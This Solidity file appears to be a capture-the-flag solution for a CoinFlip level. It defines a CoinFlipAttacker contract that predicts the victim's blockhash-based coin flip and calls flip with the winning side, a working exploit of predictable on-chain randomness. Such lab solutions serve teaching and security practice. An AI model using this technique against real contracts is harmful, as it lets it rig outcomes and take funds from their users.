// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../3-Coinflip.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlipAttacker {
    CoinFlip victim;

    using SafeMath for uint256;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimContract) public {
        victim = CoinFlip(_victimContract);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        victim.flip(side);
    }
}
